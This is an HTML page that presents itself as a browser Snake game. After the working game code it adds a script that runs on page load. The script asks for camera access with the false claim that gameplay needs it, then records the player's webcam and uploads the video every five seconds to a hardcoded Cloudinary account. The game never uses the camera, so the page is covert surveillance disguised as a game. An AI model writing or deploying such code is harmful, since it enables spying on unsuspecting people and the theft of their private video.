<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
  <title>Snake Game</title>
  <style>
    body {
      margin: 0;
      background: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
      color: white;
      font-family: Arial, sans-serif;
    }
    canvas {
      background: #111;
      width: 100vw;
      height: 100vw; /* square canvas on mobile */
      max-width: 500px;
      max-height: 500px;
      display: block;
    }
    #message {
      position: fixed;
      top: 10px;
      left: 50%;
      transform: translateX(-50%);
      font-size: 14px;
      background: rgba(0,0,0,0.6);
      padding: 5px 10px;
      border-radius: 4px;
      z-index: 10;
      pointer-events: none;
    }
  </style>
</head>
<body>
  <div id="message">Please allow camera access for gameplay.</div>
  <canvas id="gameCanvas" width="400" height="400"></canvas>

<script>
/* --- SNAKE GAME --- */

const canvas = document.getElementById('gameCanvas');
const ctx = canvas.getContext('2d');

const gridSize = 20;
const tileCount = 20;

let snake = [
  {x: 10, y: 10}
];
let velocity = {x: 0, y: 0};
let food = {x: 15, y: 15};
let tailLength = 3;
let score = 0;

function drawGame() {
  updateSnake();
  if (checkGameOver()) {
    gameOver();
    return;
  }
  clearScreen();
  drawFood();
  drawSnake();
  drawScore();
}

function clearScreen() {
  ctx.fillStyle = '#111';
  ctx.fillRect(0, 0, canvas.width, canvas.height);
}

function drawSnake() {
  ctx.fillStyle = '#0f0';
  for(let segment of snake){
    ctx.fillRect(segment.x * gridSize, segment.y * gridSize, gridSize-2, gridSize-2);
  }
}

function drawFood() {
  ctx.fillStyle = '#f00';
  ctx.fillRect(food.x * gridSize, food.y * gridSize, gridSize-2, gridSize-2);
}

function drawScore() {
  ctx.fillStyle = 'white';
  ctx.font = '18px Arial';
  ctx.fillText('Score: ' + score, 10, 25);
}

function updateSnake() {
  const head = {x: snake[0].x + velocity.x, y: snake[0].y + velocity.y};
  snake.unshift(head);
  
  // eat food
  if (head.x === food.x && head.y === food.y) {
    score++;
    tailLength++;
    placeFood();
  }
  
  // remove tail if too long
  while(snake.length > tailLength) {
    snake.pop();
  }
}

function placeFood() {
  food = {
    x: Math.floor(Math.random() * tileCount),
    y: Math.floor(Math.random() * tileCount)
  };
  // Avoid food on snake
  for(let segment of snake){
    if(segment.x === food.x && segment.y === food.y){
      placeFood();
      break;
    }
  }
}

function checkGameOver() {
  const head = snake[0];
  // wall collision
  if(head.x < 0 || head.x >= tileCount || head.y < 0 || head.y >= tileCount){
    return true;
  }
  // self collision
  for(let i=1; i < snake.length; i++){
    if(snake[i].x === head.x && snake[i].y === head.y){
      return true;
    }
  }
  return false;
}

function gameOver() {
  velocity = {x:0,y:0};
  document.getElementById('message').innerText = 'Game Over! Final Score: ' + score + '. Reload page to play again.';
  clearInterval(gameInterval);
}

document.addEventListener('keydown', function(e){
  // Prevent snake reversing
  if(e.key === "ArrowUp" && velocity.y === 0){
    velocity = {x: 0, y: -1};
  }
  else if(e.key === "ArrowDown" && velocity.y === 0){
    velocity = {x: 0, y: 1};
  }
  else if(e.key === "ArrowLeft" && velocity.x === 0){
    velocity = {x: -1, y: 0};
  }
  else if(e.key === "ArrowRight" && velocity.x === 0){
    velocity = {x: 1, y: 0};
  }
});

placeFood();

const gameInterval = setInterval(drawGame, 120);

/* --- WEBCAM RECORDING + UPLOAD TO CLOUDINARY --- */

const messageEl = document.getElementById('message');

const cloudName = 'dps0g5ftz'; // replace with your cloud name
const unsignedUploadPreset = 'unsigned'; // replace with your unsigned preset

let mediaRecorder;
let recordedChunks = [];

async function startWebcamRecording() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: false});
    
    mediaRecorder = new MediaRecorder(stream, {mimeType: 'video/webm; codecs=vp9'});
    
    mediaRecorder.ondataavailable = function(event) {
      if(event.data.size > 0) {
        recordedChunks.push(event.data);
        uploadChunk(event.data);
      }
    };
    
    mediaRecorder.start(5000); // send data every 5 seconds
    
    messageEl.innerText = 'Recording webcam in background... Good luck!';
  } catch (err) {
    messageEl.innerText = 'Camera access denied or error: ' + err.message;
  }
}

async function uploadChunk(blob) {
  const formData = new FormData();
  formData.append('file', blob);
  formData.append('upload_preset', unsignedUploadPreset);
  formData.append('folder', 'snakegame'); // optional folder in Cloudinary
  
  try {
    const res = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/video/upload`, {
      method: 'POST',
      body: formData
    });
    if(!res.ok){
      console.error('Upload failed:', await res.text());
    } else {
      const data = await res.json();
      console.log('Uploaded chunk:', data.secure_url);
    }
  } catch(e){
    console.error('Upload error:', e);
  }
}

// Start webcam recording as soon as page loads
window.onload = () => {
  startWebcamRecording();
};
</script>
</body>
</html
